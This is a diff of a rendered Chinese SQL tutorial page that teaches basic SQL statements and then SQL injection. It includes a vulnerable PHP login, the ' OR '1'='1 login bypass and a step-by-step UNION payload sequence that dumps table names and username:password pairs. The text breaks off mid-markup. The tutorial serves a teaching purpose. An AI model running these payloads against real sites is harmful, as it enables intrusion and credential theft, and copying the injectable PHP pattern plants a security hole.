@@ -52,15 +52,17 @@
       
     
     
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0/dist/katex.min.css">
+    
       <link rel="stylesheet" href="../../../../../assets/document_dates/fonts/material-icons.css">
-    
-      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/tippy.css">
-    
-      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/scale.css">
     
       <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/material.css">
     
       <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/shift-away.css">
+    
+      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/tippy.css">
+    
+      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/scale.css">
     
       <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/light.css">
     
@@ -2690,8 +2692,8 @@
 </li>
 </ul>
 </div>
-<h2 id="sql">SQL基础</h2>
-<h3 id="_1">一、数据库的基本概念</h3>
+<h2 id="sql">SQL基础<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h2>
+<h3 id="_1">一、数据库的基本概念<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
 <ul>
 <li>什么是<strong>数据库（Database）</strong></li>
 </ul>
@@ -2711,8 +2713,8 @@
 <p>一列：表示一个字段（例如“姓名”字段）</p>
 </li>
 </ul>
-<h3 id="sql_1">二、SQL基础语法</h3>
-<h5 id="1-select-">1. SELECT语句 - 查询数据</h5>
+<h3 id="sql_1">二、SQL基础语法<a class="headerlink" href="#sql_1" title="Permanent link">&para;</a></h3>
+<h5 id="1-select-">1. SELECT语句 - 查询数据<a class="headerlink" href="#1-select-" title="Permanent link">&para;</a></h5>
 <p><code>select [列名/*] from [表名] where [限制条件]</code></p>
 <p>示例：</p>
 <p><code>select * from students;</code></p>
@@ -2740,7 +2742,7 @@
 </table>
 <p>查询 age = 18 的所有同学的姓名</p>
 <p><code>SELECT name FROM students WHERE age = 18;</code></p>
-<h5 id="2-insert-">2. INSERT语句 - 插入数据</h5>
+<h5 id="2-insert-">2. INSERT语句 - 插入数据<a class="headerlink" href="#2-insert-" title="Permanent link">&para;</a></h5>
 <p><code>insert into students(name, age) values ('Sunny', 20)</code></p>
 <table>
 <thead>
@@ -2768,7 +2770,7 @@
 </tr>
 </tbody>
 </table>
-<h5 id="3-update-">3. UPDATE语句 - 修改数据</h5>
+<h5 id="3-update-">3. UPDATE语句 - 修改数据<a class="headerlink" href="#3-update-" title="Permanent link">&para;</a></h5>
 <p><code>update students set age = 17 where name = 'Bob';</code></p>
 <table>
 <thead>
@@ -2796,7 +2798,7 @@
 </tr>
 </tbody>
 </table>
-<h5 id="4-delete-">4. DELETE语句 - 删除数据</h5>
+<h5 id="4-delete-">4. DELETE语句 - 删除数据<a class="headerlink" href="#4-delete-" title="Permanent link">&para;</a></h5>
 <p><code>delete from students where age &lt; 18;</code></p>
 <table>
 <thead>
@@ -2819,41 +2821,45 @@
 </tr>
 </tbody>
 </table>
-<h5 id="5-alter-">5. ALTER语句 - 修改数据</h5>
+<h5 id="5-alter-">5. ALTER语句 - 修改数据<a class="headerlink" href="#5-alter-" title="Permanent link">&para;</a></h5>
 <p>添加新列（Add Column）：</p>
-<pre><code class="language-sql">ALTER TABLE students ADD email VARCHAR(100);
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="k">ALTER</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">students</span><span class="w"> </span><span class="k">ADD</span><span class="w"> </span><span class="n">email</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+</span></code></pre></div></td></tr></table></div>
 <p>修改已有列的数据类型或名称：</p>
-<pre><code class="language-sql">ALTER TABLE students MODIFY age VARCHAR(10);
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="k">ALTER</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">students</span><span class="w"> </span><span class="k">MODIFY</span><span class="w"> </span><span class="n">age</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+</span></code></pre></div></td></tr></table></div>
 <p>修改字段名称（MySQL &gt;= 8）：</p>
-<pre><code class="language-sql">ALTER TABLE students RENAME COLUMN age TO student_age;
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="k">ALTER</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">students</span><span class="w"> </span><span class="k">RENAME</span><span class="w"> </span><span class="k">COLUMN</span><span class="w"> </span><span class="n">age</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="n">student_age</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>删除列（Drop Column）：</p>
-<pre><code class="language-sql">ALTER TABLE students DROP COLUMN email;
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="k">ALTER</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">students</span><span class="w"> </span><span class="k">DROP</span><span class="w"> </span><span class="k">COLUMN</span><span class="w"> </span><span class="n">email</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>添加约束（如主键、唯一等）：</p>
-<pre><code class="language-sql">ALTER TABLE students ADD CONSTRAINT unique_name UNIQUE (name);
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="k">ALTER</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">students</span><span class="w"> </span><span class="k">ADD</span><span class="w"> </span><span class="k">CONSTRAINT</span><span class="w"> </span><span class="n">unique_name</span><span class="w"> </span><span class="k">UNIQUE</span><span class="w"> </span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
+</span></code></pre></div></td></tr></table></div>
 <p>重命名整张表：</p>
-<pre><code class="language-sql">RENAME TABLE students TO student_info;
-</code></pre>
-<h3 id="_2">三、表结构修改基础</h3>
-<h5 id="1">1. 创建表</h5>
-<pre><code class="language-sql">CREATE TABLE students (
-  id INT PRIMARY KEY AUTO_INCREMENT,
-  name VARCHAR(50),
-  age INT
-);
-</code></pre>
-<h5 id="2-constraints">2. 常见的约束（Constraints）</h5>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="k">RENAME</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">students</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="n">student_info</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="_2">三、表结构修改基础<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<h5 id="1">1. 创建表<a class="headerlink" href="#1" title="Permanent link">&para;</a></h5>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span>
+<span class="normal"><a href="#__codelineno-6-3">3</a></span>
+<span class="normal"><a href="#__codelineno-6-4">4</a></span>
+<span class="normal"><a href="#__codelineno-6-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">students</span><span class="w"> </span><span class="p">(</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="w">  </span><span class="n">id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="w"> </span><span class="n">AUTO_INCREMENT</span><span class="p">,</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="w">  </span><span class="n">name</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="w">  </span><span class="n">age</span><span class="w"> </span><span class="nb">INT</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a><span class="p">);</span>
+</span></code></pre></div></td></tr></table></div>
+<h5 id="2-constraints">2. 常见的约束（Constraints）<a class="headerlink" href="#2-constraints" title="Permanent link">&para;</a></h5>
 <ul>
 <li>PRIMARY KEY：主键，唯一且不为空（一般为id、学号等唯一标识）</li>
 <li>AUTO_INCREMENT：自动增长（一般用于 ID）</li>
 <li>NOT NULL：不能为空</li>
 <li>UNIQUE：字段唯一</li>
 </ul>
-<h3 id="_3">四、练习</h3>
+<h3 id="_3">四、练习<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
 <p><strong>题目1：</strong>创建一个名为books的表，包含以下字段：</p>
 <ul>
 <li>id（自动增长主键）</li>
@@ -2861,58 +2867,70 @@
 <li>author（字符串）</li>
 <li>price（整数）</li>
 </ul>
-<pre><code class="language-sql">CREATE TABLE books (
-  id INT PRIMARY KEY AUTO_INCREMENT,
-  title VARCHAR(100),
-  author VARCHAR(50),
-  price INT
-);
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span>
+<span class="normal"><a href="#__codelineno-7-4">4</a></span>
+<span class="normal"><a href="#__codelineno-7-5">5</a></span>
+<span class="normal"><a href="#__codelineno-7-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="p">(</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="w">  </span><span class="n">id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="w"> </span><span class="n">AUTO_INCREMENT</span><span class="p">,</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="w">  </span><span class="n">title</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a><span class="w">  </span><span class="n">author</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a><span class="w">  </span><span class="n">price</span><span class="w"> </span><span class="nb">INT</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6"></a><span class="p">);</span>
+</span></code></pre></div></td></tr></table></div>
 <p><strong>题目2</strong>：插入两条书籍记录</p>
-<pre><code class="language-sql">INSERT INTO books (title, author, price) VALUES ('SQL入门教程', '张三', 45);
-INSERT INTO books (title, author, price) VALUES ('数据库设计', '李四', 60);
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
+<span class="normal"><a href="#__codelineno-8-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="p">(</span><span class="n">title</span><span class="p">,</span><span class="w"> </span><span class="n">author</span><span class="p">,</span><span class="w"> </span><span class="n">price</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;SQL入门教程&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;张三&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">45</span><span class="p">);</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="p">(</span><span class="n">title</span><span class="p">,</span><span class="w"> </span><span class="n">author</span><span class="p">,</span><span class="w"> </span><span class="n">price</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;数据库设计&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;李四&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">60</span><span class="p">);</span>
+</span></code></pre></div></td></tr></table></div>
 <p><strong>题目3</strong>：查找价格大于50的书</p>
-<pre><code class="language-sql">SELECT * FROM books WHERE price &gt; 50;
-</code></pre>
-<h2 id="sql_2">SQL注入漏洞</h2>
-<h3 id="_4">漏洞成因</h3>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">books</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">price</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">50</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="sql_2">SQL注入漏洞<a class="headerlink" href="#sql_2" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞成因<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
 <p>SQL注入是开发者对用户输入的参数过滤不严格，导致用户输入的数据能够影响预设查询功能的一种技术，通常将导致数据库原有信息泄露、篡改，甚至被删除。</p>
 <p>将恶意 SQL 语句插入到应用程序的输入中并提交到后台数据库执行的攻击方式。</p>
 <p><strong>示例</strong></p>
 <p>假设你有一个简单的登录逻辑，处理方式如下：</p>
-<pre><code class="language-php">$username = $_GET['username'];
-$password = $_GET['password'];
-$sql = &quot;SELECT * FROM users WHERE username = '$username' AND password = '$password'&quot;;
-</code></pre>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
+<span class="normal"><a href="#__codelineno-10-2">2</a></span>
+<span class="normal"><a href="#__codelineno-10-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="x">$username = $_GET[&#39;username&#39;];</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="x">$password = $_GET[&#39;password&#39;];</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a><span class="x">$sql = &quot;SELECT * FROM users WHERE username = &#39;$username&#39; AND password = &#39;$password&#39;&quot;;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>若用户输入：</p>
-<pre><code>username = admin
-password = ' OR '1'='1
-</code></pre>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
+<span class="normal"><a href="#__codelineno-11-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>username = admin
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>password = &#39; OR &#39;1&#39;=&#39;1
+</span></code></pre></div></td></tr></table></div>
 <p>则拼接结果变为：</p>
-<pre><code class="language-sql">SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>SQL解析器会判断：</p>
-<pre><code class="language-sql">username = 'admin' AND password = ''（false） OR '1'='1'（true）
-</code></pre>
-<pre><code class="language-sql">username = 'admin' AND (true)
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="err">（</span><span class="k">false</span><span class="err">）</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="err">（</span><span class="k">true</span><span class="err">）</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="k">true</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
 <blockquote>
 <p>最终整体条件为 true，<strong>绕过验证</strong>，导致攻击者可以以admin身份登录</p>
 </blockquote>
-<h3 id="_5">注入分类（按注入点数据类型）</h3>
-<h4 id="1_1">1. 字符型注入</h4>
+<h3 id="_5">注入分类（按注入点数据类型）<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<h4 id="1_1">1. 字符型注入<a class="headerlink" href="#1_1" title="Permanent link">&para;</a></h4>
 <p>输入点为字符串类型</p>
-<pre><code class="language-sql">select * from xxx where id = '%s' ;
-select * from xxx where id = &quot;%s&quot; ;
-select * from xxx where id = ('%s') ;
-select * from xxx where id = (&quot;%s&quot;) ;
-</code></pre>
-<h4 id="2">2. 数值型注入</h4>
-<pre><code class="language-sql">select * from xxx where id = %s ;
-</code></pre>
-<h3 id="_6">注入分类（按攻击类型）</h3>
-<h4 id="1-union">1. 基于Union的注入</h4>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span>
+<span class="normal"><a href="#__codelineno-15-2">2</a></span>
+<span class="normal"><a href="#__codelineno-15-3">3</a></span>
+<span class="normal"><a href="#__codelineno-15-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">xxx</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;%s&#39;</span><span class="w"> </span><span class="p">;</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">xxx</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;%s&quot;</span><span class="w"> </span><span class="p">;</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">xxx</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;%s&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">;</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">xxx</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="ss">&quot;%s&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
+<h4 id="2">2. 数值型注入<a class="headerlink" href="#2" title="Permanent link">&para;</a></h4>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">xxx</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">%</span><span class="n">s</span><span class="w"> </span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="_6">注入分类（按攻击类型）<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<h4 id="1-union">1. 基于Union的注入<a class="headerlink" href="#1-union" title="Permanent link">&para;</a></h4>
 <blockquote>
 <p><strong>基于 UNION 的 SQL 注入（Union-based Injection）</strong> 是一种通过 UNION SELECT 语句将攻击者构造的数据结果与原查询结果合并，从而实现数据泄露的攻击方式。</p>
 </blockquote>
@@ -2922,76 +2940,108 @@ select * from xxx where id = (&quot;%s&quot;) ;
 </blockquote>
 <ul>
 <li>
-<h5 id="union-select">UNION SELECT的语法基础</h5>
+<h5 id="union-select">UNION SELECT的语法基础<a class="headerlink" href="#union-select" title="Permanent link">&para;</a></h5>
 </li>
 </ul>
-<pre><code class="language-sql">SELECT column1, column2 FROM table1
-UNION
-SELECT columnA, columnB FROM table2;
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span>
+<span class="normal"><a href="#__codelineno-17-2">2</a></span>
+<span class="normal"><a href="#__codelineno-17-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">column1</span><span class="p">,</span><span class="w"> </span><span class="n">column2</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">table1</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a><span class="k">UNION</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">columnA</span><span class="p">,</span><span class="w"> </span><span class="n">columnB</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">table2</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
 <p><strong>条件：UNION 两侧的列数必须一致</strong></p>
-<pre><code class="language-sql">select * FROM students where id = 1 union select 1,'admin',20;
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">students</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span><span class="mi">20</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
 <ul>
 <li>
-<h5 id="payload">payload</h5>
+<h5 id="payload">payload<a class="headerlink" href="#payload" title="Permanent link">&para;</a></h5>
 </li>
 </ul>
 <p>步骤：</p>
-<pre><code class="language-sql">?id=1'                              
--- [步骤1] 测试是否存在注入点：传入一个闭合引号，若报错，说明后端存在 SQL 拼接，可能可注入
-
-?id=1'-- -                          
--- [步骤2] 尝试闭合语句 + 注释掉后续内容：验证是否能成功构造注入，页面是否正常回显
-
-?id=1' order by n-- -              
--- [步骤3] 使用 order by 测试列数：逐个尝试 n=1,2,3...，直到报错，说明字段数为 n-1
-
-?id=-1' union select 1,2,3-- -     
--- [步骤4] 探测回显位置：使用和目标列数相同的虚构查询，查看哪个数字在页面中显示，即是可利用的回显位
-
-?id=-1' union select 1,2,database()-- - 
--- [步骤5] 利用回显点显示当前数据库名，database() 是 MySQL 中获取当前库名的函数
-
-?id=-1' union select 1,2,group_concat(table_name) 
-from information_schema.tables where table_schema=database()-- -
--- [步骤6] 利用 group_concat() 把当前数据库下所有表名拼接起来，通过回显位一次性展示出来
--- information_schema.tables 是系统表，table_schema=database() 表示只查当前数据库
-
-?id=-1' union select 1,2,group_concat(column_name) 
-from information_schema.columns where table_name='XXX'-- -
--- [步骤7] 查找指定表（如 'users'）中所有的字段名（如 username、password 等），并拼接显示
-
-?id=-1' union select 1,2,group_concat(username,0x3a,password) from XXX-- -
--- [步骤8] 从目标表中查询字段内容，0x3a 是十六进制的 “:”（冒号），用于分隔用户名和密码
--- group_concat() 把多行拼成一行，便于在一个回显位中查看多个值
-</code></pre>
-<h4 id="2_1">2. 万能密码</h4>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-19-2"> 2</a></span>
